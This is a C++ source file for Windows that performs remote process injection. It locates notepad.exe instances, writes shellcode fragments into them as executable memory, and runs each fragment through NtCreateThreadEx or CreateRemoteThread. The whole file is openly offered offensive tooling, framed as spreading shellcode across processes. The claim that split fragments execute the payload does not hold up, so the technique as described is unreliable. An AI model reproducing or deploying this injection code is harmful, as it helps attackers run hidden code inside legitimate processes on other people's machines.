#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <vector>
#include <winternl.h>

// NT API definition for thread creation
typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes,
    IN HANDLE ProcessHandle,
    IN PVOID StartRoutine,
    IN PVOID Argument OPTIONAL,
    IN ULONG CreateFlags,
    IN SIZE_T ZeroBits,
    IN SIZE_T StackSize,
    IN SIZE_T MaximumStackSize,
    IN PVOID AttributeList OPTIONAL
    );

// Shellcode for testing (opens MessageBox)
unsigned char shellcode[] =
"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xcc\x00\x00\x00\x41";

size_t shellcodeSize = sizeof(shellcode) - 1;
int numParts = 3;  // Number of processes to split the shellcode into

std::vector<DWORD> processList;

// 🔍 **Find Target Processes**
DWORD FindProcessID(const wchar_t* processName) {
    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    DWORD processID = 0;

    if (Process32First(snapshot, &processEntry)) {
        do {
            if (_wcsicmp(processEntry.szExeFile, processName) == 0) {
                processID = processEntry.th32ProcessID;
                processList.push_back(processID);
            }
        } while (Process32Next(snapshot, &processEntry));
    }
    CloseHandle(snapshot);
    return processID;
}

// 🛠 **Inject and Execute Shellcode Fragments Directly in Target Processes**
bool InjectAndExecuteFragment(DWORD pid, unsigned char* fragment, size_t fragmentSize) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        std::cout << "[-] Failed to open process " << pid << std::endl;
        return false;
    }

    // Allocate memory for the fragment in the remote process
    LPVOID remoteAddress = VirtualAllocEx(hProcess, NULL, fragmentSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteAddress) {
        std::cout << "[-] Failed to allocate memory in process " << pid << "\n";
        CloseHandle(hProcess);
        return false;
    }

    // Write shellcode fragment into process memory
    if (!WriteProcessMemory(hProcess, remoteAddress, fragment, fragmentSize, NULL)) {
        std::cout << "[-] Failed to write fragment in process " << pid << "\n";
        CloseHandle(hProcess);
        return false;
    }

    std::cout << "[+] Fragment injected into PID " << pid << " at address: " << remoteAddress << std::endl;

    // Ensure memory is executable
    DWORD oldProtect;
    VirtualProtectEx(hProcess, remoteAddress, fragmentSize, PAGE_EXECUTE_READWRITE, &oldProtect);

    // Create a remote thread to execute the shellcode fragment
    HANDLE hThread;
    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtCreateThreadEx");

    if (NtCreateThreadEx) {
        NTSTATUS status = NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, hProcess, remoteAddress, NULL, FALSE, 0, 0, 0, NULL);
        if (status == 0) {
            std::cout << "[+] Fragment executed in process PID: " << pid << std::endl;
            CloseHandle(hThread);
        }
        else {
            std::cout << "[-] Failed to execute fragment. NTSTATUS: " << std::hex << status << std::endl;
        }
    }
    else {
        std::cout << "[!] NtCreateThreadEx not found. Attempting CreateRemoteThread...\n";
        hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteAddress, NULL, 0, NULL);
        if (hThread) {
            std::cout << "[+] Fragment successfully executed in process PID: " << pid << std::endl;
            CloseHandle(hThread);
        }
        else {
            std::cout << "[-] Failed to start fragment via CreateRemoteThread.\n";
        }
    }

    CloseHandle(hProcess);
    return true;
}

int main() {
    FindProcessID(L"notepad.exe");

    if (processList.size() < numParts) {
        std::cout << "[-] Insufficient number of target processes. Open more instances of Notepad!\n";
        return -1;
    }

    size_t partSize = shellcodeSize / numParts;

    std::cout << "[*] Injecting and executing shellcode fragments...\n";
    for (int i = 0; i < numParts; i++) {
        DWORD targetPID = processList[i];

        if (!InjectAndExecuteFragment(targetPID, shellcode + (i * partSize), partSize)) {
            std::cout << "[-] Injection and execution failed in process " << targetPID << "\n";
            return -1;
        }

        std::cout << "[+] Fragment " << i + 1 << " executed in PID: " << targetPID << "\n";
    }

    std::cout << "[*] Shellcode successfully executed across fragmented processes!\n";
    return 0;
}
